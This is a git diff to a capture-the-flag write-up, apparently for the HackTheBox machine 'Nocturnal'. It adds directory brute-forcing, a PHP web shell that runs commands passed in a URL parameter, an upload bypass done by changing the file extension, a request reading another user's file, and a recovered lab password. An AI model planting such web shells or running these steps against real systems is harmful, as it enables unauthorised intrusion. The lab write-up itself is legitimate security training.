@@ -25,17 +25,71 @@ pinc -c 1 10.10.11.64
 nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.11.64 -oG allPorts
 nmap -sCV -p22,80 10.10.11.64 -oN targeted
 
+gobuster dir -u http://nocturnal.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 60
+
 
 ```
 
 ### Exploitation
 
-
 ```bash
 amanda: arHkG7HAI68X8s1J
-```
 
-\[Describe the outcome, e.g., initial shell access, user-level credentials.\]
+# Creating a php file
+```
+```php
+
+<?php
+  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+?>
+```
+- Upload file and send. View it on burpsuite to sending it to Repeater and change file extension to .pdf!
+[alt text](image.png)
+
+![alt text](image-1.png)
+
+```bash
+We use created .sh file to enumerate users.
+
+searchUsers.sh
+# ans
+sh serarchUsers.sh 
+[+] admin
+[+] amanda
+
+# change user and downlao .odt file
+/view.php?username=amanda&file=pwn.pdf
+
+# Install odt2txt into machine
+odt2txt privacy.odt
+# ans
+Dear Amanda,
+
+Nocturnal has set the following temporary password for you:
+arHkG7HAI68X8s1J. This password has been set for all our
+services, so it is essential that you change it on your first
+login to ensure the security of your account and our
+infrastructure.
+
+The file has been created and provided by Nocturnal's IT team.
+If you have any questions or need additional assistance during
+the password change process, please do not hesitate to contact
+us.
+
+Remember that maintaining the security of your credentials is
+paramount to protecting your information and that of the
+company. We appreciate your prompt attention to this matter.
+
+Yours sincerely,
+
+Nocturnal's IT team
+
+# pass
+arHkG7HAI68X8s1J
+
+
+
+```
 
 ### Privilege Escalation
 
